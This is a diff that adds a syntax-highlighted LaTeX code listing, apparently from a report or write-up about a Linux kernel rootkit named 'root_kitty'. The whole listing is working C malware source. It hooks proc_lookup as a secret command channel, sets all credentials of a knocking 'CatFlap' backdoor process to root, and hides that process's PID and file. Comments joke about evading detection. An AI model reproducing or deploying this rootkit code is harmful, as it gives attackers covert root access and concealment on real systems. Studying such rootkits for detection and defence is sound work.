@@ -1,0 +1,56 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{c+cm}{/**}
+\PYG{c+cm}{ * Hijack\PYGZsq{}d lookup which we\PYGZsq{}re using as a comm channel. :\PYGZca{})}
+\PYG{c+cm}{ */}
+\PYG{k}{struct} \PYG{n}{dentry} \PYG{o}{*}\PYG{n+nf}{proc\PYGZus{}lookup}\PYG{p}{(}\PYG{k}{struct} \PYG{n}{inode} \PYG{o}{*}\PYG{n}{i}\PYG{p}{,} \PYG{k}{struct} \PYG{n}{dentry} \PYG{o}{*}\PYG{n}{d}\PYG{p}{,}\PYG{k+kt}{unsigned} \PYG{k+kt}{int} \PYG{n}{flag}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+    \PYG{c+c1}{// Lock current task to avoid race conditions.}
+    \PYG{n}{task\PYGZus{}lock}\PYG{p}{(}\PYG{n}{current}\PYG{p}{);}
+
+    \PYG{c+c1}{// Convert ulong pid to string because my architecture sucks and I\PYGZsq{}m out of time :\PYGZca{})}
+    \PYG{k+kt}{char} \PYG{n}{s\PYGZus{}pid}\PYG{p}{[}\PYG{l+m+mi}{64}\PYG{p}{];}
+    \PYG{n}{sprintf}\PYG{p}{(}\PYG{n}{s\PYGZus{}pid}\PYG{p}{,} \PYG{l+s}{\PYGZdq{}\PYGZpc{}lu\PYGZdq{}}\PYG{p}{,} \PYG{n}{current}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{pid}\PYG{p}{);}
+
+    \PYG{c+c1}{// If the current inode has the secret key, fetch the command from it and process it.}
+    \PYG{k}{if}\PYG{p}{(}\PYG{n}{strncmp}\PYG{p}{(}\PYG{n}{SECRET\PYGZus{}KEY}\PYG{p}{,} \PYG{n}{d}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{d\PYGZus{}name}\PYG{p}{.}\PYG{n}{name}\PYG{p}{,} \PYG{n}{strlen}\PYG{p}{(}\PYG{n}{SECRET\PYGZus{}KEY}\PYG{p}{))}\PYG{o}{==}\PYG{l+m+mi}{0}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+        \PYG{n}{printk}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}root\PYGZus{}kitty: Secret key detected, fetching command.}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{);}
+        \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{cmd} \PYG{o}{=} \PYG{n}{get\PYGZus{}cmd}\PYG{p}{(}\PYG{n}{d}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{d\PYGZus{}name}\PYG{p}{.}\PYG{n}{name}\PYG{p}{);}
+        \PYG{n}{printk}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}root\PYGZus{}kitty: }\PYG{l+s+se}{\PYGZbs{}t}\PYG{l+s}{`\PYGZhy{}\PYGZgt{}Received command: \PYGZpc{}s}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{,} \PYG{n}{cmd}\PYG{p}{);}
+
+        \PYG{c+c1}{// HIDE\PYGZus{}BD: If backdoor knocks, give it root and hide its file + PID.}
+        \PYG{k}{if} \PYG{p}{(}\PYG{n}{strncmp}\PYG{p}{(}\PYG{n}{cmd}\PYG{p}{,} \PYG{n}{HIDE\PYGZus{}BD}\PYG{p}{,} \PYG{n}{strlen}\PYG{p}{(}\PYG{n}{cmd}\PYG{p}{))} \PYG{o}{==} \PYG{l+m+mi}{0}\PYG{p}{)\PYGZob{}}
+
+            \PYG{c+c1}{// Elevate process to root.}
+            \PYG{n}{printk}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}root\PYGZus{}kitty: Granting CatFlap root}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{);}
+            \PYG{k}{struct} \PYG{n}{cred} \PYG{o}{*}\PYG{n}{orig\PYGZus{}cred} \PYG{o}{=} \PYG{n}{get\PYGZus{}current\PYGZus{}cred}\PYG{p}{();}
+            \PYG{k}{struct} \PYG{n}{cred} \PYG{o}{*}\PYG{n}{root\PYGZus{}cred} \PYG{o}{=} \PYG{n}{prepare\PYGZus{}creds}\PYG{p}{();}
+
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{uid}\PYG{p}{.}\PYG{n}{val}   \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{gid}\PYG{p}{.}\PYG{n}{val}   \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{euid}\PYG{p}{.}\PYG{n}{val}  \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{egid}\PYG{p}{.}\PYG{n}{val}  \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{suid}\PYG{p}{.}\PYG{n}{val}  \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{sgid}\PYG{p}{.}\PYG{n}{val}  \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{fsuid}\PYG{p}{.}\PYG{n}{val} \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{root\PYGZus{}cred}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{fsgid}\PYG{p}{.}\PYG{n}{val} \PYG{o}{=} \PYG{l+m+mi}{0}\PYG{p}{;}
+            \PYG{n}{commit\PYGZus{}creds}\PYG{p}{(}\PYG{n}{root\PYGZus{}cred}\PYG{p}{);}
+
+            \PYG{c+c1}{// Hide the backdoor by adding its PID and file to our lists.}
+            \PYG{n}{printk}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}root\PYGZus{}kitty: }\PYG{l+s+se}{\PYGZbs{}t}\PYG{l+s}{Adding \PYGZpc{}u to PID list}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{,} \PYG{n}{current}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{pid}\PYG{p}{);}
+            \PYG{n}{pid\PYGZus{}add}\PYG{p}{(}\PYG{n}{s\PYGZus{}pid}\PYG{p}{);}
+
+            \PYG{n}{printk}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}root\PYGZus{}kitty: }\PYG{l+s+se}{\PYGZbs{}t}\PYG{l+s}{Adding \PYGZpc{}s to file list}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{,} \PYG{n}{current}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{comm}\PYG{p}{);}
+            \PYG{n}{file\PYGZus{}add}\PYG{p}{(}\PYG{n}{current}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{comm}\PYG{p}{);}
+        \PYG{p}{\PYGZcb{}}
+    \PYG{p}{\PYGZcb{}}
+    \PYG{n}{task\PYGZus{}unlock}\PYG{p}{(}\PYG{n}{current}\PYG{p}{);}
+
+    \PYG{c+c1}{// Nothing to see here, officer.}
+    \PYG{n}{original\PYGZus{}proc\PYGZus{}lookup} \PYG{o}{=} \PYG{n}{asm\PYGZus{}hook\PYGZus{}unpatch}\PYG{p}{(}\PYG{n}{proc\PYGZus{}lookup}\PYG{p}{);}
+    \PYG{k}{struct} \PYG{n}{dentry} \PYG{o}{*}\PYG{n}{ret} \PYG{o}{=} \PYG{n}{original\PYGZus{}proc\PYGZus{}lookup}\PYG{p}{(}\PYG{n}{i}\PYG{p}{,} \PYG{n}{d}\PYG{p}{,} \PYG{n}{flag}\PYG{p}{);}
+    \PYG{n}{asm\PYGZus{}hook\PYGZus{}patch}\PYG{p}{(}\PYG{n}{proc\PYGZus{}lookup}\PYG{p}{);}
+
+    \PYG{k}{return} \PYG{n}{ret}\PYG{p}{;}
+\PYG{p}{\PYGZcb{}}
+\end{Verbatim}
